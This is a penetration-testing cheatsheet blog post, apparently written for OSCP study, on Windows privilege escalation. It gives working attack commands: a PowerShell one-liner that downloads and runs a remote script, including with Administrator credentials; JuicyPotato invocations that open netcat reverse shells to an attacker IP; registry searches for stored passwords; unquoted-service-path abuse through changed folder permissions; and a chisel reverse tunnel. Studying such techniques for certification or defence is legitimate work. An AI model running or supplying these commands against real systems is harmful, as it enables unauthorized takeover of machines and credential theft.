---
title: Windows Privilege Escalation
author: sKyW1per
category: "OSCP"
date: "2021-03-13 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start Process with PowerShell
```
How to use powershell to pop a second connection with interactive shell
Open a listener on a port and a web server with payload on another.
Then run:
$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"

Starting a shell as Administrator (when the password is known)

First: make a variable of the credentials. Because Windows doesn't like it when you pass passwords in plain text to a command
$ $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
$ $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)

Then pop the shell
$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
```


###### Potato attacks
```
If both SeChangeNotifyPrivilege and SeImpersonatePrivilege are enabled

Hot Potato
https://foxglovesecurity.com/2016/01/16/hot-potato/

Rotten Potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato

Juicy Potato
https://github.com/ohpe/juicy-potato
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
x86 variant:
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2

Example juicy potato:

List of CLSID's:
http://ohpe.it/juicy-potato/CLSID/

On attacker system:
$ nc -nvlp 80
On target system:
First upload nc.exe & JuicyPotato.exe, and place it in current dir
$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
Or using a different CLSID:
$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
```

###### Autologon Credentials in registry
```
search for "Password" string:
$ reg query HKLM /f Password /t Reg_SZ /s
query the specific registry entry (example):
$ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

###### Unquoted Path
```
Prerequisites:
- Write access in the right folder
- Ability to either restart the service or trigger a re-start by rebooting
If you want to privesc also check:
- Does the service run as a high(er) privileged user?

finding services with autostart:
$ wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
$ sc query "ServiceName"

Folder permissions:
$ icacls "C:\Program Files\Some Subfolder"
$ icacls "C:\Program Files\Some Subfolder" /grant "Builtin\Users":w

and reboot after placing the payload.
```

###### DLL Hijacking
```
Prerequisites:
- Included in a running Process
- Result = "NAME NOT FOUND"
- Path ends with .dll
```

###### Port Forwarding
```
https://github.com/jpillora/chisel
1 upload chisel to the box

2 start chisel on kali
$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse

3 run chisel on the target
$ .\c.exe client 192.168.1.1:8000 R:8888:localhost:8888

4 see if the connection is made
port 8888 on kali should be listening now:
$ netstat -ntlp

5 do stuff from kali on address 127.0.0.1 port 8888
```

###### Kernel Exploits ~ Resources
```
Seclists
https://github.com/SecWiki/windows-kernel-exploits

Empire
https://github.com/EmpireProject/Empire/tree/master/data/module_source
```
